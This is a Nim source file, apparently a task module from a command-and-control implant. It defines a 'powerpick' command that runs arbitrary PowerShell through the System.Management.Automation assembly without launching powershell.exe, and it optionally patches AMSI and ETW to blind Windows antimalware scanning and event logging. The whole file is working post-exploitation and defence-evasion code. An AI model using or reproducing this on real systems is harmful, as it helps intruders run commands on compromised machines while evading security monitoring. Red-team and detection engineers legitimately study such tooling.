import json

when defined(windows):
  import winim/clr except `[]`
  import winim/lean
  import ../utils/patches
  
  type
    PowerpickArgs = object
      command: string
      patch_amsi_arg: bool
      block_etw_arg: bool

proc powerpick*(taskId: string, params: JsonNode): JsonNode =
  ## Execute a PowerShell command via System.Management.Automation assembly
  ## without calling powershell.exe
  when not defined(windows):
    return %*{
      "task_id": taskId,
      "completed": true,
      "status": "error",
      "user_output": "powerpick is only supported on Windows"
    }
  else:
    try:
      let args = to(params, PowerpickArgs)
      
      if args.command.len == 0:
        return %*{
          "task_id": taskId,
          "completed": true,
          "status": "error",
          "user_output": "Command cannot be empty"
        }
      
      var output = "Executing command via unmanaged PowerShell...\n"
      
      # Apply patches if requested
      if args.patch_amsi_arg:
        let res = patchAMSI()
        case res
        of 0:
          output.add("[+] AMSI patched successfully!\n")
        of 1:
          output.add("[-] Failed to patch AMSI\n")
        of 2:
          output.add("[+] AMSI already patched\n")
        else:
          discard
      
      if args.block_etw_arg:
        let res = patchETW()
        case res
        of 0:
          output.add("[+] ETW patched successfully!\n")
        of 1:
          output.add("[-] Failed to patch ETW\n")
        of 2:
          output.add("[+] ETW already patched\n")
        else:
          discard
      
      # Load System.Management.Automation and create runspace
      output.add("[*] Creating PowerShell runspace...\n")
      let Automation = load("System.Management.Automation")
      let RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
      
      var runspace = @RunspaceFactory.CreateRunspace()
      var pipeline = runspace.CreatePipeline()
      
      runspace.Open()
      pipeline.Commands.AddScript(args.command)
      pipeline.Commands.Add("Out-String")
      
      output.add("[*] Executing command...\n")
      var pipeOut = pipeline.Invoke()
      
      output.add("\n=== PowerShell Output ===\n")
      for i in countUp(0, pipeOut.Count() - 1):
        output.add($pipeOut.Item(i))
      output.add("========================\n")
      
      runspace.Dispose()
      output.add("[+] Command execution completed\n")
      
      return %*{
        "task_id": taskId,
        "completed": true,
        "status": "success",
        "user_output": output
      }
      
    except Exception as e:
      return %*{
        "task_id": taskId,
        "completed": true,
        "status": "error",
        "user_output": "Failed to execute PowerShell command: " & e.msg
      }